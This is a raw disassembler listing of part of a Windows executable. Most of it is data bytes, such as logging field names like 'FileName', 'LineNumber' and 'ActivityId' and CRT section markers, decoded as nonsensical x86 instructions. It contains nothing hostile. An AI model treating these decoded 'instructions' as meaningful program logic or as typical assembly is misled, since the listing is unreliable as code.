  401d86:	add    ecx,DWORD PTR [ebx]
  401d88:	add    eax,0x2
  401d8d:	add    BYTE PTR [eax],al
  401d8f:	and    BYTE PTR [eax],al
  401d91:	add    BYTE PTR [edi],dh
  401d93:	add    BYTE PTR [eax],al
  401d95:	inc    edx
  401d96:	jne    0x401e01
  401d98:	ins    BYTE PTR es:[edi],dx
  401d99:	fs push ebx
  401d9b:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  401da0:	outs   dx,BYTE PTR ds:[esi]
  401da1:	inc    edi
  401da2:	jb     0x401e13
  401da4:	jne    0x401e16
  401da6:	jae    0x401da8
  401da8:	ja     0x401e13
  401daa:	ins    BYTE PTR es:[edi],dx
  401dab:	inc    ecx
  401dac:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  401db0:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x72680298
  401db8:	gs jae 0x401e30
  401dbb:	ins    BYTE PTR es:[edi],dx
  401dbc:	je     0x401dbe
  401dbe:	or     BYTE PTR [eax+ebp*2+0x72],dh
  401dc2:	gs popa 
  401dc4:	fs dec ecx
  401dc6:	add    BYTE PTR fs:[eax],cl
  401dc9:	add    ecx,DWORD PTR [ebx]
  401dcb:	add    eax,0x0
  401dd0:	add    BYTE PTR [eax],al
  401dd2:	and    BYTE PTR [eax],al
  401dd4:	add    BYTE PTR [ecx+eax*1],bl
  401dd7:	add    BYTE PTR [ecx+0x63],al
  401dda:	je     0x401e45
  401ddc:	jbe    0x401e47
  401dde:	je     0x401e59
  401de0:	inc    ebp
  401de1:	jb     0x401e55
  401de3:	outs   dx,DWORD PTR ds:[esi]
  401de4:	jb     0x401de6
  401de6:	ja     0x401e51
  401de8:	ins    BYTE PTR es:[edi],dx
  401de9:	inc    ecx
  401dea:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  401dee:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x72681198
  401df6:	gs jae 0x401e6e
  401df9:	ins    BYTE PTR es:[edi],dx
  401dfa:	je     0x401dfc
  401dfc:	or     BYTE PTR [esi+0x69],ah
  401dff:	ins    BYTE PTR es:[edi],dx
  401e00:	gs dec esi
  401e02:	popa   
  401e03:	ins    DWORD PTR es:[edi],dx
  401e04:	add    BYTE PTR gs:[edx],al
  401e07:	ins    BYTE PTR es:[edi],dx
  401e08:	imul   ebp,DWORD PTR [esi+0x65],0x626d754e
  401e0f:	gs jb  0x401e12
  401e12:	or     BYTE PTR [ebp+0x6f],ch
  401e15:	fs jne 0x401e84
  401e18:	add    BYTE PTR gs:[edx],al
  401e1b:	popaw  
  401e1d:	imul   ebp,DWORD PTR [ebp+esi*2+0x72],0x70795465
  401e25:	add    BYTE PTR gs:[eax],cl
  401e28:	ins    DWORD PTR es:[edi],dx
  401e29:	gs jae 0x401e9f
  401e2c:	popa   
  401e2d:	add    BYTE PTR gs:[bx+di],al
  401e31:	je     0x401e9b
  401e33:	jb     0x401e9a
  401e35:	popa   
  401e36:	fs dec ecx
  401e38:	add    BYTE PTR fs:[eax],cl
  401e3b:	arpl   WORD PTR [ecx+0x6c],sp
  401e3e:	ins    BYTE PTR es:[edi],dx
  401e3f:	inc    ebx
  401e40:	outs   dx,DWORD PTR ds:[esi]
  401e41:	outs   dx,BYTE PTR ds:[esi]
  401e42:	je     0x401ea9
  401e44:	js     0x401eba
  401e46:	add    BYTE PTR [edx],al
  401e48:	outs   dx,DWORD PTR ds:[esi]
  401e49:	jb     0x401eb4
  401e4b:	imul   ebp,DWORD PTR [bp+0x61],0x676e6974
  401e53:	inc    ebx
  401e54:	outs   dx,DWORD PTR ds:[esi]
  401e55:	outs   dx,BYTE PTR ds:[esi]
  401e56:	je     0x401ebd
  401e58:	js     0x401ece
  401e5a:	dec    ecx
  401e5b:	add    BYTE PTR fs:[eax],cl
  401e5e:	outs   dx,DWORD PTR ds:[esi]
  401e5f:	jb     0x401eca
  401e61:	imul   ebp,DWORD PTR [bp+0x61],0x676e6974
  401e69:	inc    ebx
  401e6a:	outs   dx,DWORD PTR ds:[esi]
  401e6b:	outs   dx,BYTE PTR ds:[esi]
  401e6c:	je     0x401ed3
  401e6e:	js     0x401ee4
  401e70:	dec    esi
  401e71:	popa   
  401e72:	ins    DWORD PTR es:[edi],dx
  401e73:	add    BYTE PTR gs:[edx],al
  401e76:	outs   dx,DWORD PTR ds:[esi]
  401e77:	jb     0x401ee2
  401e79:	imul   ebp,DWORD PTR [bp+0x61],0x676e6974
  401e81:	inc    ebx
  401e82:	outs   dx,DWORD PTR ds:[esi]
  401e83:	outs   dx,BYTE PTR ds:[esi]
  401e84:	je     0x401eeb
  401e86:	js     0x401efc
  401e88:	dec    ebp
  401e89:	gs jae 0x401eff
  401e8c:	popa   
  401e8d:	add    BYTE PTR gs:[bx+di],al
  401e91:	arpl   WORD PTR [ebp+0x72],si
  401e94:	jb     0x401efb
  401e96:	outs   dx,BYTE PTR ds:[esi]
  401e97:	je     0x401edc
  401e99:	outs   dx,DWORD PTR ds:[esi]
  401e9a:	outs   dx,BYTE PTR ds:[esi]
  401e9b:	je     0x401f02
  401e9d:	js     0x401f13
  401e9f:	dec    ecx
  401ea0:	add    BYTE PTR fs:[eax],cl
  401ea3:	arpl   WORD PTR [ebp+0x72],si
  401ea6:	jb     0x401f0d
  401ea8:	outs   dx,BYTE PTR ds:[esi]
  401ea9:	je     0x401eee
  401eab:	outs   dx,DWORD PTR ds:[esi]
  401eac:	outs   dx,BYTE PTR ds:[esi]
  401ead:	je     0x401f14
  401eaf:	js     0x401f25
  401eb1:	dec    esi
  401eb2:	popa   
  401eb3:	ins    DWORD PTR es:[edi],dx
  401eb4:	add    BYTE PTR gs:[edx],al
  401eb7:	arpl   WORD PTR [ebp+0x72],si
  401eba:	jb     0x401f21
  401ebc:	outs   dx,BYTE PTR ds:[esi]
  401ebd:	je     0x401f02
  401ebf:	outs   dx,DWORD PTR ds:[esi]
  401ec0:	outs   dx,BYTE PTR ds:[esi]
  401ec1:	je     0x401f28
  401ec3:	js     0x401f39
  401ec5:	dec    ebp
  401ec6:	gs jae 0x401f3c
  401ec9:	popa   
  401eca:	add    BYTE PTR gs:[bx+di],al
  401ece:	popaw  
  401ed0:	imul   ebp,DWORD PTR [ebp+esi*2+0x72],0x644965
  401ed8:	or     BYTE PTR [esi+0x61],ah
  401edb:	imul   ebp,DWORD PTR [ebp+esi*2+0x72],0x756f4365
  401ee3:	outs   dx,BYTE PTR ds:[esi]
  401ee4:	je     0x401ee6
  401ee6:	or     BYTE PTR [esi+0x75],ah
  401ee9:	outs   dx,BYTE PTR ds:[esi]
  401eea:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  401eee:	outs   dx,BYTE PTR ds:[esi]
  401eef:	add    BYTE PTR [edx],al
  401ef1:	add    ecx,DWORD PTR [ebx]
  401ef3:	add    eax,0x0
  401ef8:	add    BYTE PTR [eax],al
  401efa:	and    BYTE PTR [eax],al
  401efc:	add    BYTE PTR [edi],cl
  401efe:	add    BYTE PTR [eax],al
  401f00:	dec    esi
  401f01:	outs   dx,DWORD PTR ds:[esi]
  401f02:	je     0x401f56
  401f04:	outs   dx,BYTE PTR gs:[esi]
  401f06:	popa   
  401f07:	ins    DWORD PTR es:[edi],dx
  401f08:	imul   ebp,DWORD PTR [esi+0x67],0x50b0300
  401f0f:	add    BYTE PTR [eax],al
  401f11:	add    BYTE PTR [eax],al
  401f13:	add    BYTE PTR [eax],al
  401f15:	and    BYTE PTR [eax],al
  401f17:	add    BYTE PTR [edi],cl
  401f19:	add    BYTE PTR [eax],al
  401f1b:	dec    esi
  401f1c:	outs   dx,DWORD PTR ds:[esi]
  401f1d:	je     0x401f63
  401f1f:	gs ins BYTE PTR es:[edi],dx
  401f21:	gs je  0x401f8d
  401f24:	outs   dx,BYTE PTR ds:[esi]
  401f25:	add    BYTE PTR [bp+di],al
  401f28:	or     eax,DWORD PTR ds:0x0
  401f2e:	add    BYTE PTR [eax],al
  401f30:	and    BYTE PTR [eax],al
  401f32:	add    cl,bh
  401f34:	add    BYTE PTR [eax],al
  401f36:	inc    ecx
  401f37:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  401f3b:	imul   esi,DWORD PTR [ecx+edi*2+0x45],0x726f7272
  401f43:	add    BYTE PTR [edi+0x69],dh
  401f46:	ins    BYTE PTR es:[edi],dx
  401f47:	inc    ecx
  401f48:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  401f4c:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x72680e98
  401f54:	gs jae 0x401fcc
  401f57:	ins    BYTE PTR es:[edi],dx
  401f58:	je     0x401f5a
  401f5a:	or     BYTE PTR [esi+0x69],ah
  401f5d:	ins    BYTE PTR es:[edi],dx
  401f5e:	gs dec esi
  401f60:	popa   
  401f61:	ins    DWORD PTR es:[edi],dx
  401f62:	add    BYTE PTR gs:[edx],al
  401f65:	ins    BYTE PTR es:[edi],dx
  401f66:	imul   ebp,DWORD PTR [esi+0x65],0x626d754e
  401f6d:	gs jb  0x401f70
  401f70:	or     BYTE PTR [ebp+0x6f],ch
  401f73:	fs jne 0x401fe2
  401f76:	add    BYTE PTR gs:[edx],al
  401f79:	popaw  
  401f7b:	imul   ebp,DWORD PTR [ebp+esi*2+0x72],0x70795465
  401f83:	add    BYTE PTR gs:[eax],cl
  401f86:	ins    DWORD PTR es:[edi],dx
  401f87:	gs jae 0x401ffd
  401f8a:	popa   
  401f8b:	add    BYTE PTR gs:[bx+di],al
  401f8f:	je     0x401ff9
  401f91:	jb     0x401ff8
  401f93:	popa   
  401f94:	fs dec ecx
  401f96:	add    BYTE PTR fs:[eax],cl
  401f99:	arpl   WORD PTR [ecx+0x6c],sp
  401f9c:	ins    BYTE PTR es:[edi],dx
  401f9d:	inc    ebx
  401f9e:	outs   dx,DWORD PTR ds:[esi]
  401f9f:	outs   dx,BYTE PTR ds:[esi]
  401fa0:	je     0x402007
  401fa2:	js     0x402018
  401fa4:	add    BYTE PTR [edx],al
  401fa6:	outs   dx,DWORD PTR ds:[esi]
  401fa7:	jb     0x402012
  401fa9:	imul   ebp,DWORD PTR [bp+0x61],0x676e6974
  401fb1:	inc    ebx
  401fb2:	outs   dx,DWORD PTR ds:[esi]
  401fb3:	outs   dx,BYTE PTR ds:[esi]
  401fb4:	je     0x40201b
  401fb6:	js     0x40202c
  401fb8:	dec    ecx
  401fb9:	add    BYTE PTR fs:[eax],cl
  401fbc:	outs   dx,DWORD PTR ds:[esi]
  401fbd:	jb     0x402028
  401fbf:	imul   ebp,DWORD PTR [bp+0x61],0x676e6974
  401fc7:	inc    ebx
  401fc8:	outs   dx,DWORD PTR ds:[esi]
  401fc9:	outs   dx,BYTE PTR ds:[esi]
  401fca:	je     0x402031
  401fcc:	js     0x402042
  401fce:	dec    esi
  401fcf:	popa   
  401fd0:	ins    DWORD PTR es:[edi],dx
  401fd1:	add    BYTE PTR gs:[edx],al
  401fd4:	outs   dx,DWORD PTR ds:[esi]
  401fd5:	jb     0x402040
  401fd7:	imul   ebp,DWORD PTR [bp+0x61],0x676e6974
  401fdf:	inc    ebx
  401fe0:	outs   dx,DWORD PTR ds:[esi]
  401fe1:	outs   dx,BYTE PTR ds:[esi]
  401fe2:	je     0x402049
  401fe4:	js     0x40205a
  401fe6:	dec    ebp
  401fe7:	gs jae 0x40205d
  401fea:	popa   
  401feb:	add    BYTE PTR gs:[bx+di],al
  401fef:	arpl   WORD PTR [ebp+0x72],si
  401ff2:	jb     0x402059
  401ff4:	outs   dx,BYTE PTR ds:[esi]
  401ff5:	je     0x40203a
  401ff7:	outs   dx,DWORD PTR ds:[esi]
  401ff8:	outs   dx,BYTE PTR ds:[esi]
  401ff9:	je     0x402060
  401ffb:	js     0x402071
  401ffd:	dec    ecx
  401ffe:	add    BYTE PTR fs:[eax],cl
  402001:	arpl   WORD PTR [ebp+0x72],si
  402004:	jb     0x40206b
  402006:	outs   dx,BYTE PTR ds:[esi]
  402007:	je     0x40204c
  402009:	outs   dx,DWORD PTR ds:[esi]
  40200a:	outs   dx,BYTE PTR ds:[esi]
  40200b:	je     0x402072
  40200d:	js     0x402083
  40200f:	dec    esi
  402010:	popa   
  402011:	ins    DWORD PTR es:[edi],dx
  402012:	add    BYTE PTR gs:[edx],al
  402015:	arpl   WORD PTR [ebp+0x72],si
  402018:	jb     0x40207f
  40201a:	outs   dx,BYTE PTR ds:[esi]
  40201b:	je     0x402060
  40201d:	outs   dx,DWORD PTR ds:[esi]
  40201e:	outs   dx,BYTE PTR ds:[esi]
  40201f:	je     0x402086
  402021:	js     0x402097
  402023:	dec    ebp
  402024:	gs jae 0x40209a
  402027:	popa   
  402028:	add    BYTE PTR gs:[bx+di],al
  40202c:	add    ecx,DWORD PTR [ebx]
  40202e:	add    eax,0x0
  402033:	add    BYTE PTR [eax],al
  402035:	add    BYTE PTR [eax],al
  402037:	add    BYTE PTR [edx],bl
  402039:	add    DWORD PTR [eax],eax
  40203b:	inc    esi
  40203c:	popa   
  40203d:	ins    BYTE PTR es:[edi],dx
  40203e:	ins    BYTE PTR es:[edi],dx
  40203f:	bound  esp,QWORD PTR [ecx+0x63]
  402042:	imul   eax,DWORD PTR [ebp+0x72],0x72
  402046:	outs   dx,DWORD PTR ds:[esi]
  402047:	jb     0x402049
  402049:	ja     0x4020b4
  40204b:	ins    BYTE PTR es:[edi],dx
  40204c:	push   edx
  40204d:	gs jae 0x4020c5
  402050:	ins    BYTE PTR es:[edi],dx
  402051:	je     0x402053
  402053:	cwde   
  402054:	adc    DWORD PTR [eax+0x72],ebp
  402057:	gs jae 0x4020cf
  40205a:	ins    BYTE PTR es:[edi],dx
  40205b:	je     0x40205d
  40205d:	or     BYTE PTR [esi+0x69],ah
  402060:	ins    BYTE PTR es:[edi],dx
  402061:	gs dec esi
  402063:	popa   
  402064:	ins    DWORD PTR es:[edi],dx
  402065:	add    BYTE PTR gs:[edx],al
  402068:	ins    BYTE PTR es:[edi],dx
  402069:	imul   ebp,DWORD PTR [esi+0x65],0x626d754e
  402070:	gs jb  0x402073
  402073:	or     BYTE PTR [ebp+0x6f],ch
  402076:	fs jne 0x4020e5
  402079:	add    BYTE PTR gs:[edx],al
  40207c:	popaw  
  40207e:	imul   ebp,DWORD PTR [ebp+esi*2+0x72],0x70795465
  402086:	add    BYTE PTR gs:[eax],cl
  402089:	ins    DWORD PTR es:[edi],dx
  40208a:	gs jae 0x402100
  40208d:	popa   
  40208e:	add    BYTE PTR gs:[bx+di],al
  402092:	je     0x4020fc
  402094:	jb     0x4020fb
  402096:	popa   
  402097:	fs dec ecx
  402099:	add    BYTE PTR fs:[eax],cl
  40209c:	arpl   WORD PTR [ecx+0x6c],sp
  40209f:	ins    BYTE PTR es:[edi],dx
  4020a0:	inc    ebx
  4020a1:	outs   dx,DWORD PTR ds:[esi]
  4020a2:	outs   dx,BYTE PTR ds:[esi]
  4020a3:	je     0x40210a
  4020a5:	js     0x40211b
  4020a7:	add    BYTE PTR [edx],al
  4020a9:	outs   dx,DWORD PTR ds:[esi]
  4020aa:	jb     0x402115
  4020ac:	imul   ebp,DWORD PTR [bp+0x61],0x676e6974
  4020b4:	inc    ebx
  4020b5:	outs   dx,DWORD PTR ds:[esi]
  4020b6:	outs   dx,BYTE PTR ds:[esi]
  4020b7:	je     0x40211e
  4020b9:	js     0x40212f
  4020bb:	dec    ecx
  4020bc:	add    BYTE PTR fs:[eax],cl
  4020bf:	outs   dx,DWORD PTR ds:[esi]
  4020c0:	jb     0x40212b
  4020c2:	imul   ebp,DWORD PTR [bp+0x61],0x676e6974
  4020ca:	inc    ebx
  4020cb:	outs   dx,DWORD PTR ds:[esi]
  4020cc:	outs   dx,BYTE PTR ds:[esi]
  4020cd:	je     0x402134
  4020cf:	js     0x402145
  4020d1:	dec    esi
  4020d2:	popa   
  4020d3:	ins    DWORD PTR es:[edi],dx
  4020d4:	add    BYTE PTR gs:[edx],al
  4020d7:	outs   dx,DWORD PTR ds:[esi]
  4020d8:	jb     0x402143
  4020da:	imul   ebp,DWORD PTR [bp+0x61],0x676e6974
  4020e2:	inc    ebx
  4020e3:	outs   dx,DWORD PTR ds:[esi]
  4020e4:	outs   dx,BYTE PTR ds:[esi]
  4020e5:	je     0x40214c
  4020e7:	js     0x40215d
  4020e9:	dec    ebp
  4020ea:	gs jae 0x402160
  4020ed:	popa   
  4020ee:	add    BYTE PTR gs:[bx+di],al
  4020f2:	arpl   WORD PTR [ebp+0x72],si
  4020f5:	jb     0x40215c
  4020f7:	outs   dx,BYTE PTR ds:[esi]
  4020f8:	je     0x40213d
  4020fa:	outs   dx,DWORD PTR ds:[esi]
  4020fb:	outs   dx,BYTE PTR ds:[esi]
  4020fc:	je     0x402163
  4020fe:	js     0x402174
  402100:	dec    ecx
  402101:	add    BYTE PTR fs:[eax],cl
  402104:	arpl   WORD PTR [ebp+0x72],si
  402107:	jb     0x40216e
  402109:	outs   dx,BYTE PTR ds:[esi]
  40210a:	je     0x40214f
  40210c:	outs   dx,DWORD PTR ds:[esi]
  40210d:	outs   dx,BYTE PTR ds:[esi]
  40210e:	je     0x402175
  402110:	js     0x402186
  402112:	dec    esi
  402113:	popa   
  402114:	ins    DWORD PTR es:[edi],dx
  402115:	add    BYTE PTR gs:[edx],al
  402118:	arpl   WORD PTR [ebp+0x72],si
  40211b:	jb     0x402182
  40211d:	outs   dx,BYTE PTR ds:[esi]
  40211e:	je     0x402163
  402120:	outs   dx,DWORD PTR ds:[esi]
  402121:	outs   dx,BYTE PTR ds:[esi]
  402122:	je     0x402189
  402124:	js     0x40219a
  402126:	dec    ebp
  402127:	gs jae 0x40219d
  40212a:	popa   
  40212b:	add    BYTE PTR gs:[bx+di],al
  40212f:	popaw  
  402131:	imul   ebp,DWORD PTR [ebp+esi*2+0x72],0x644965
  402139:	or     BYTE PTR [esi+0x61],ah
  40213c:	imul   ebp,DWORD PTR [ebp+esi*2+0x72],0x756f4365
  402144:	outs   dx,BYTE PTR ds:[esi]
  402145:	je     0x402147
  402147:	or     BYTE PTR [esi+0x75],ah
  40214a:	outs   dx,BYTE PTR ds:[esi]
  40214b:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  40214f:	outs   dx,BYTE PTR ds:[esi]
  402150:	add    BYTE PTR [edx],al
  402152:	add    ecx,DWORD PTR [ebx]
  402154:	add    eax,0x2
  402159:	add    BYTE PTR [eax],al
  40215b:	and    BYTE PTR [eax],al
  40215d:	add    BYTE PTR [eax],ah
  40215f:	add    BYTE PTR [eax],al
  402161:	inc    ecx
  402162:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  402166:	imul   esi,DWORD PTR [ecx+edi*2+0x53],0x70706f74
  40216e:	gs fs inc ecx
  402171:	jne    0x4021e7
  402173:	outs   dx,DWORD PTR ds:[esi]
  402174:	ins    DWORD PTR es:[edi],dx
  402175:	popa   
  402176:	je     0x4021e1
  402178:	arpl   WORD PTR [ecx+0x6c],sp
  40217b:	ins    BYTE PTR es:[edi],dx
  40217c:	jns    0x40217e
  40217e:	add    ecx,DWORD PTR [ebx]
  402180:	add    eax,0x2
  402185:	add    BYTE PTR [eax],al
  402187:	and    BYTE PTR [eax],al
  402189:	add    dh,bh
  40218b:	add    BYTE PTR [eax],al
  40218d:	inc    edx
  40218e:	jne    0x4021f9
  402190:	ins    BYTE PTR es:[edi],dx
  402191:	fs inc esp
  402193:	gs popaw 
  402196:	jne    0x402204
  402198:	je     0x4021e1
  40219a:	jb     0x40220b
  40219c:	jne    0x40220e
  40219e:	jae    0x4021a0
  4021a0:	ja     0x40220b
  4021a2:	ins    BYTE PTR es:[edi],dx
  4021a3:	inc    ecx
  4021a4:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  4021a8:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x72680e98
  4021b0:	gs jae 0x402228
  4021b3:	ins    BYTE PTR es:[edi],dx
  4021b4:	je     0x4021b6
  4021b6:	or     BYTE PTR [esi+0x69],ah
  4021b9:	ins    BYTE PTR es:[edi],dx
  4021ba:	gs dec esi
  4021bc:	popa   
  4021bd:	ins    DWORD PTR es:[edi],dx
  4021be:	add    BYTE PTR gs:[edx],al
  4021c1:	ins    BYTE PTR es:[edi],dx
  4021c2:	imul   ebp,DWORD PTR [esi+0x65],0x626d754e
  4021c9:	gs jb  0x4021cc
  4021cc:	or     BYTE PTR [ebp+0x6f],ch
  4021cf:	fs jne 0x40223e
  4021d2:	add    BYTE PTR gs:[edx],al
  4021d5:	popaw  
  4021d7:	imul   ebp,DWORD PTR [ebp+esi*2+0x72],0x70795465
  4021df:	add    BYTE PTR gs:[eax],cl
  4021e2:	ins    DWORD PTR es:[edi],dx
  4021e3:	gs jae 0x402259
  4021e6:	popa   
  4021e7:	add    BYTE PTR gs:[bx+di],al
  4021eb:	je     0x402255
  4021ed:	jb     0x402254
  4021ef:	popa   
  4021f0:	fs dec ecx
  4021f2:	add    BYTE PTR fs:[eax],cl
  4021f5:	arpl   WORD PTR [ecx+0x6c],sp
  4021f8:	ins    BYTE PTR es:[edi],dx
  4021f9:	inc    ebx
  4021fa:	outs   dx,DWORD PTR ds:[esi]
  4021fb:	outs   dx,BYTE PTR ds:[esi]
  4021fc:	je     0x402263
  4021fe:	js     0x402274
  402200:	add    BYTE PTR [edx],al
  402202:	outs   dx,DWORD PTR ds:[esi]
  402203:	jb     0x40226e
  402205:	imul   ebp,DWORD PTR [bp+0x61],0x676e6974
  40220d:	inc    ebx
  40220e:	outs   dx,DWORD PTR ds:[esi]
  40220f:	outs   dx,BYTE PTR ds:[esi]
  402210:	je     0x402277
  402212:	js     0x402288
  402214:	dec    ecx
  402215:	add    BYTE PTR fs:[eax],cl
  402218:	outs   dx,DWORD PTR ds:[esi]
  402219:	jb     0x402284
  40221b:	imul   ebp,DWORD PTR [bp+0x61],0x676e6974
  402223:	inc    ebx
  402224:	outs   dx,DWORD PTR ds:[esi]
  402225:	outs   dx,BYTE PTR ds:[esi]
  402226:	je     0x40228d
  402228:	js     0x40229e
  40222a:	dec    esi
  40222b:	popa   
  40222c:	ins    DWORD PTR es:[edi],dx
  40222d:	add    BYTE PTR gs:[edx],al
  402230:	outs   dx,DWORD PTR ds:[esi]
  402231:	jb     0x40229c
  402233:	imul   ebp,DWORD PTR [bp+0x61],0x676e6974
  40223b:	inc    ebx
  40223c:	outs   dx,DWORD PTR ds:[esi]
  40223d:	outs   dx,BYTE PTR ds:[esi]
  40223e:	je     0x4022a5
  402240:	js     0x4022b6
  402242:	dec    ebp
  402243:	gs jae 0x4022b9
  402246:	popa   
  402247:	add    BYTE PTR gs:[bx+di],al
  40224b:	arpl   WORD PTR [ebp+0x72],si
  40224e:	jb     0x4022b5
  402250:	outs   dx,BYTE PTR ds:[esi]
  402251:	je     0x402296
  402253:	outs   dx,DWORD PTR ds:[esi]
  402254:	outs   dx,BYTE PTR ds:[esi]
  402255:	je     0x4022bc
  402257:	js     0x4022cd
  402259:	dec    ecx
  40225a:	add    BYTE PTR fs:[eax],cl
  40225d:	arpl   WORD PTR [ebp+0x72],si
  402260:	jb     0x4022c7
  402262:	outs   dx,BYTE PTR ds:[esi]
  402263:	je     0x4022a8
  402265:	outs   dx,DWORD PTR ds:[esi]
  402266:	outs   dx,BYTE PTR ds:[esi]
  402267:	je     0x4022ce
  402269:	js     0x4022df
  40226b:	dec    esi
  40226c:	popa   
  40226d:	ins    DWORD PTR es:[edi],dx
  40226e:	add    BYTE PTR gs:[edx],al
  402271:	arpl   WORD PTR [ebp+0x72],si
  402274:	jb     0x4022db
  402276:	outs   dx,BYTE PTR ds:[esi]
  402277:	je     0x4022bc
  402279:	outs   dx,DWORD PTR ds:[esi]
  40227a:	outs   dx,BYTE PTR ds:[esi]
  40227b:	je     0x4022e2
  40227d:	js     0x4022f3
  40227f:	dec    ebp
  402280:	gs jae 0x4022f6
  402283:	popa   
  402284:	add    BYTE PTR gs:[bx+di],al
  402288:	add    ecx,DWORD PTR [ebx]
  40228a:	add    eax,0x0
  40228f:	add    BYTE PTR [eax],al
  402291:	add    BYTE PTR [eax],al
  402293:	add    BYTE PTR ds:0x63410000,bh
  402299:	je     0x402304
  40229b:	jbe    0x402306
  40229d:	je     0x402318
  40229f:	dec    ecx
  4022a0:	outs   dx,BYTE PTR ds:[esi]
  4022a1:	je     0x402308
  4022a3:	jb     0x402312
  4022a5:	gs imul esp,DWORD PTR fs:[ecx+0x74],0x6f745365
  4022ae:	jo     0x4022b0
  4022b0:	ja     0x40231b
  4022b2:	ins    BYTE PTR es:[edi],dx
  4022b3:	inc    ecx
  4022b4:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  4022b8:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x72680298
  4022c0:	gs jae 0x402338
  4022c3:	ins    BYTE PTR es:[edi],dx
  4022c4:	je     0x4022c6
  4022c6:	or     BYTE PTR [eax+ebp*2+0x72],dh
  4022ca:	gs popa 
  4022cc:	fs dec ecx
  4022ce:	add    BYTE PTR fs:[eax],cl
  4022d1:	add    al,0x95
  4022d3:	sub    BYTE PTR [eax],0x99
  4022d6:	xchg   esp,eax
  4022d7:	rcl    BYTE PTR [esi+ebx*2-0x1de79736],cl
  4022de:	cli    
  4022df:	ins    BYTE PTR es:[edi],dx
  4022e0:	les    esp,FWORD PTR [esp+edi*1]
  4022e3:	add    BYTE PTR [ebp+0x69],cl
  4022e6:	arpl   WORD PTR [edx+0x6f],si
  4022e9:	jae    0x40235a
  4022eb:	data16 je 0x40231c
  4022ee:	push   edi
  4022ef:	imul   ebp,DWORD PTR [esi+0x64],0x2e73776f
  4022f6:	push   ebx
  4022f7:	push   0x2e6c6c65
  4022fc:	inc    edi
  4022fd:	jb     0x40236e
  4022ff:	jne    0x402371
  402301:	inc    ebx
  402302:	outs   dx,DWORD PTR ds:[esi]
  402303:	outs   dx,BYTE PTR ds:[esi]
  402304:	jbe    0x40236b
  402306:	jb     0x40237c
  402308:	gs jb  0x40230b
  40230b:	adc    eax,DWORD PTR [eax]
  40230d:	add    DWORD PTR [edx],ebx
  40230f:	jae    0x402361
  402311:	dec    edi
  402312:	iret   
  402313:	mov    DWORD PTR [edx-0x231f4cb9],eax
  402319:	call   0xbab627e7
  40231e:	add    DWORD PTR [eax],eax
  402320:	push   edx
  402321:	push   ebx
  402322:	inc    esp
  402323:	push   ebx
  402324:	dec    ebp
  402325:	inc    ecx
  402326:	test   BYTE PTR [eax+0x490325c4],bl
  40232c:	mov    eax,0x9f98bb2b
  402331:	loop   0x402377
  402333:	lds    eax,FWORD PTR [ecx]
  402335:	add    BYTE PTR [eax],al
  402337:	add    BYTE PTR [edi+0x72],ah
  40233a:	jo     0x40239f
  40233c:	outs   dx,DWORD PTR ds:[esi]
  40233d:	outs   dx,BYTE PTR ds:[esi]
  40233e:	jbe    0x40236e
  402340:	jo     0x4023a6
  402342:	bound  eax,QWORD PTR [eax]
	...
  402358:	inc    edi
  402359:	inc    ebx
  40235a:	push   esp
  40235b:	dec    esp
  40235c:	add    BYTE PTR [eax],dl
  40235e:	add    BYTE PTR [eax],al
  402360:	add    al,0x0
  402362:	add    BYTE PTR [eax],al
  402364:	cs inc ebx
  402366:	push   edx
  402367:	push   esp
  402368:	and    al,0x58
  40236a:	inc    ebx
  40236b:	inc    ecx
  40236c:	add    BYTE PTR [eax],al
  40236e:	add    BYTE PTR [eax],al
  402370:	add    al,0x10
  402372:	add    BYTE PTR [eax],al
  402374:	add    al,0x0
  402376:	add    BYTE PTR [eax],al
  402378:	cs inc ebx
  40237a:	push   edx
  40237b:	push   esp
  40237c:	and    al,0x58
  40237e:	inc    ebx
  40237f:	inc    ecx
  402380:	inc    ecx
  402381:	add    BYTE PTR [eax],al
  402383:	add    BYTE PTR [eax],cl
  402385:	adc    BYTE PTR [eax],al
  402387:	add    BYTE PTR [eax],cl
  402389:	add    BYTE PTR [eax],al
  40238b:	add    BYTE PTR [esi],ch
  40238d:	inc    ebx
  40238e:	push   edx
  40238f:	push   esp
  402390:	and    al,0x58
  402392:	inc    ebx
  402393:	push   ebp
  402394:	add    BYTE PTR [eax],al
  402396:	add    BYTE PTR [eax],al
  402398:	adc    BYTE PTR [eax],dl
  40239a:	add    BYTE PTR [eax],al
  40239c:	add    al,0x0
  40239e:	add    BYTE PTR [eax],al
  4023a0:	cs inc ebx
  4023a2:	push   edx
  4023a3:	push   esp
  4023a4:	and    al,0x58
  4023a6:	inc    ebx
  4023a7:	pop    edx
  4023a8:	add    BYTE PTR [eax],al
  4023aa:	add    BYTE PTR [eax],al
  4023ac:	adc    al,0x10
  4023ae:	add    BYTE PTR [eax],al
  4023b0:	add    al,0x0
  4023b2:	add    BYTE PTR [eax],al
  4023b4:	cs inc ebx
  4023b6:	push   edx
  4023b7:	push   esp
  4023b8:	and    al,0x58
  4023ba:	dec    ecx
  4023bb:	inc    ecx
  4023bc:	add    BYTE PTR [eax],al
  4023be:	add    BYTE PTR [eax],al
  4023c0:	sbb    BYTE PTR [eax],dl
  4023c2:	add    BYTE PTR [eax],al
  4023c4:	add    al,0x0
  4023c6:	add    BYTE PTR [eax],al
  4023c8:	cs inc ebx
  4023ca:	push   edx
  4023cb:	push   esp
  4023cc:	and    al,0x58
  4023ce:	dec    ecx
  4023cf:	inc    ecx
  4023d0:	inc    ecx
  4023d1:	add    BYTE PTR [eax],al
  4023d3:	add    BYTE PTR [eax+edx*1],bl
  4023d6:	add    BYTE PTR [eax],al
  4023d8:	add    al,0x0
  4023da:	add    BYTE PTR [eax],al
  4023dc:	cs inc ebx
  4023de:	push   edx
  4023df:	push   esp
  4023e0:	and    al,0x58
  4023e2:	dec    ecx
  4023e3:	pop    ecx
  4023e4:	add    BYTE PTR [eax],al
